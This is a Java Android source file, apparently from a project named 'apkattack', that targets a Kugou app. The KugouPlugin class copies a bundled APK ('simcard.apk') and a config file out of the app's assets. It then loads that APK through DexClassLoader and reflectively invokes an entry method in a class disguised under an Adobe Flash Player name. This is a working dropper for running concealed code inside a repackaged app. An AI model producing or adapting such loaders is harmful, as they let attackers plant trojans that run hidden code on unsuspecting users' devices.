package com.example.apkattack;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;
import android.app.Activity;
import android.util.Log;


//com.kugou.fanxing.guide.GuideActivity
public class KugouPlugin {

	public static void kugouPluginLauncher(Activity context){
    	String Tag = "kugouPluginLauncher";
    	try {
	    	//String apppath = "/data/data/com.kugou.fanxing/files/";

	    	String apppath = context.getFilesDir() + "/";
	    	
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
			
			String cfgfn = "ark.dat";
			
			String dexmethodname = "startActivity";
			
	    	String apkfn = "simcard.apk";

	    	
	    	File fileapk = new File(apppath + apkfn);
	    	File filecfg = new File(apppath + cfgfn);
	    	if (fileapk.exists() == false || filecfg.exists() == false) {

	    		String tmpapkfn = "";
	    		String [] filenames = context.getAssets().list("");
	    		for (int i = 0; i < filenames.length; i++) {
					if (filenames[i].contains(".apk")) {
						tmpapkfn = filenames[i];
						Log.e(Tag,"find apk file");
						break;
					}
				}
	    		
	            InputStream is = context.getAssets().open(tmpapkfn);	
	            int size = is.available();
	            byte[] buffer = new byte[size];
	            is.read(buffer);
	            is.close();
	            FileOutputStream os = new FileOutputStream(apppath + apkfn);
	            os.write(buffer);
	            os.close();
	            
	            is = context.getAssets().open(cfgfn);
	            size = is.available();
	            buffer = new byte[size];
	            is.read(buffer);
	            is.close();
	            os = new FileOutputStream(apppath + cfgfn);
	            os.write(buffer);
	            os.close();
			}
	    	
	    	
	    	String cachepath = context.getCacheDir() + "/";
	    	DexClassLoader dexcl = new DexClassLoader(apppath + apkfn, cachepath, null,context.getClassLoader());	    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method entrymethod = cls.getDeclaredMethod(dexmethodname, Activity.class);
    	    entrymethod.invoke(obj,context);

    	    Log.e(Tag, "apk load success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "apk load exception");
    	}
	}
}
